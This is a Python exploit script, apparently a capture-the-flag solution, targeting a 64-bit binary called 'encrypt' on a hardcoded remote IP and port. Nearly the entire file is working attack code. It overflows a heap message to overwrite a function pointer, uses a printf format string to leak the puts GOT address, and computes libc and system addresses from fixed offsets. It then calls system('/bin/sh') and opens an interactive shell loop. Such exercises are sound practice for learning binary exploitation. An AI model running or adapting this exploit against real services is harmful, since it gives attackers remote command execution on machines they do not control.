# encoding:utf-8

## 64位，堆溢出覆盖函数指针，使用libcdatabase获取system偏移

from zio import *
from pwn import *

io = zio(('101.200.187.112',9005), timeout=99999, 
#io = zio('./encrypt', timeout = 9999, 
        print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW,'blue'))

e = elf.ELF('./encrypt')
ptr_addr = 0x06020B0

def new_msg(msg):
	io.read_until('Exit.')
	io.writeline('1')
	io.read_until(':')
	io.write(msg)
	io.read_until(':')
	io.writeline('1')

def edit_msg(id, msg):
	io.read_until('Exit.')
	io.writeline('3')
	io.read_until(':')
	io.writeline(str(id))
	io.read_until(':')
	io.write(msg)

def enc_msg(id):
	io.read_until('Exit.')
	io.writeline('2')
	io.read_until(':')
	io.writeline(str(id))

#io.gdb_hint(breakpoints=[0x400B12, 0x0400CAF])

def leak(addr):
	new_msg('A'*0x50)
	new_msg('B'*0x50)
	
	payload = 'C'*0x50 + 'D'*0x8 + p32(0x71) + p32(0) + p32(e.plt['printf'])  
	edit_msg(1,payload)
	
	payload = '%s##\x00'.ljust(0x50,'A') + p32(addr)
	edit_msg(0,payload)
	
	
	enc_msg(0)
	io.read_until('\n')
	buf = io.read_until('##')
	return buf.strip('#')
def pwn_it(sys_addr):
	new_msg('A'*0x50)
	new_msg('B'*0x50)
	
	payload = 'C'*0x50 + 'D'*0x8 + p32(0x71) + p32(0) + p64(sys_addr)  
	edit_msg(1,payload)
	
	payload = '/bin/sh;\x00'.ljust(0x50,'A') 
	edit_msg(0,payload)	
	enc_msg(0)

puts_addr = u64(leak(e.got['puts']).ljust(8,'\x00'))

print 'puts_addr:', hex(puts_addr)
libc_base = puts_addr - 0x00006fe30
sys_addr = libc_base + 0x0000046640

#l_sys_addr = 0x7ffff7a744f0
#l_puts = 0x7ffff7a9e9f0
#sys_addr = puts_addr - l_puts + l_sys_addr

print 'sys_addr:', hex(sys_addr)

pwn_it(sys_addr)

while True:
	io.read_until_timeout()
	io.writeline(raw_input('>>'))
